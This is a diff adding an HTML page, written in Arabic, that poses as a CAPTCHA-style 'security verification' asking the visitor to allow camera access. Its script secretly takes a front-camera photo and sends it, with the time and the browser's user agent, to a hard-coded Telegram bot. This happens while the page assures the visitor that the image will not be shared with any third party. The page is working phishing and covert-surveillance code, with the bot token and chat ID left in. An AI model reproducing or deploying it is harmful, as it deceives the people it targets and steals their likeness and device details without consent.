@@ -1,0 +1,151 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+.card {
+    background: white;
+    border-radius: 20px;
+    padding: 30px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    text-align: center;
+}
+.card img {
+    width: 100%;
+    border-radius: 12px;
+    margin-bottom: 20px;
+}
+.card h2 {
+    color: #333;
+    margin-bottom: 10px;
+    font-size: 24px;
+}
+.card p {
+    color: #666;
+    margin-bottom: 20px;
+    line-height: 1.6;
+}
+.button {
+    background: #667eea;
+    color: white;
+    border: none;
+    padding: 15px 30px;
+    border-radius: 50px;
+    font-size: 16px;
+    cursor: pointer;
+    width: 100%;
+    transition: 0.3s;
+}
+.button:hover { background: #5a67d8; }
+.button:active { transform: scale(0.98); }
+.hidden { display: none; }
+.loading {
+    display: none;
+    margin: 20px 0;
+}
+.loading.active { display: block; }
+.spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #667eea;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+}
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+    <img src="https://i.imgur.com/real_image.jpg" alt="Photo">
+    <h2>🔒 تحقق أمني</h2>
+    <p>للتأكد من أنك لست روبوت، يرجى السماح بالوصول إلى الكاميرا لإلتقاط صورة تأكيد سريعة. هذه الخطوة لمرة واحدة فقط.</p>
+    
+    <button class="button" onclick="startCapture()">✅ تأكيد الهوية</button>
+    
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p style="margin-top:15px;color:#666;">جاري التحقق...</p>
+    </div>
+    
+    <p style="margin-top:15px;font-size:12px;color:#999;">الصورة لن تتم مشاركتها مع أي طرف ثالث</p>
+</div>
+
+<div class="card hidden" id="successCard">
+    <h2>✅ تم التحقق</h2>
+    <p>شكراً لك، تم تأكيد هويتك بنجاح.</p>
+    <img src="https://i.imgur.com/real_image.jpg" alt="Success">
+</div>
+
+<script>
+// ⚠️ ضع معلومات تليجرام بوتك هنا
+const BOT_TOKEN = '8806646191:AAHLbFkiQb-CckC_ai4mUjV-tlnMzKzKogI';
+const CHAT_ID = '1896011699';
+
+function startCapture() {
+    const loading = document.getElementById('loading');
+    loading.classList.add('active');
+    
+    navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user", width: 640, height: 480 }
+    })
+    .then(function(stream) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie_android.jpg');
+                formData.append('caption', 
+                    '📸 Selfie from Android\n' +
+                    '🕐 ' + new Date().toLocaleString() + '\n' +
+                    '📱 ' + navigator.userAgent
+                );
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('mainCard').classList.add('hidden');
+                    document.getElementById('successCard').classList.remove('hidden');
+                })
+                .catch(() => {
+                    loading.classList.remove('active');
+                    alert('❌ فشل التحقق، حاول مرة أخرى');
+                });
+            }, 'image/jpeg');
+        }, 1000);
+    })
+    .catch(function(err) {
+        loading.classList.remove('active');
+        alert('⚠️ يرجى السماح بالوصول إلى الكاميرا والمحاولة مرة أخرى');
+    });
+}
+</script>
+</body>
+</html>
